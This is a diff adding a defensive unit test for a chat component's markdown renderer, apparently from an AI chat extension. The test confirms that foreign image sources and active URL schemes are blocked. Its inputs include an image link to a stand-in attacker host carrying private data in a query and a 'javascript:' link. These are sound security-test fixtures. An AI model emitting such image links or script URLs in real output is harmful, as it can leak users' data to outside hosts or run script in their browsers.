@@ -2,6 +2,7 @@ import { render, screen } from '@testing-library/react';
 import { MemoryRouter } from 'react-router';
 import { describe, expect, it } from 'vitest';
 
+import { MarkdownView } from '../../client/components/markdown-view';
 import { Markdown } from '../../client/components/talent/markdown';
 import { MarkdownMessage } from '../../client/extensions/nocobase-ai/components/chat/markdown-message';
 import { isSafeImageSrc } from '../../client/extensions/nocobase-ai/shared/safe-markdown-urls';
@@ -60,4 +61,22 @@ describe('Markdown images (readiness review 2026-10-07)', () => {
     expect(container.innerHTML).toContain('https://evil.example/p.png');
     expect(container.innerHTML).not.toContain('javascript:');
   });
+});
+
+// The native Registry chat must preserve the application's image and URL policy.
+it('keeps native chat Markdown same-origin and blocks active URL schemes', () => {
+  const { container } = render(
+    <MarkdownView
+      content={`![foreign](https://evil.example/?d=private) ![logo](/main/logo.png) ![dot](${PNG}) [bad](javascript:alert%281%29)`}
+    />,
+  );
+  expect(
+    [...container.querySelectorAll('img')].map((image) =>
+      image.getAttribute('src'),
+    ),
+  ).toEqual(['/main/logo.png', PNG]);
+  expect(
+    container.querySelector('a[href="https://evil.example/?d=private"]'),
+  ).toBeInTheDocument();
+  expect(container.innerHTML).not.toContain('javascript:');
 });
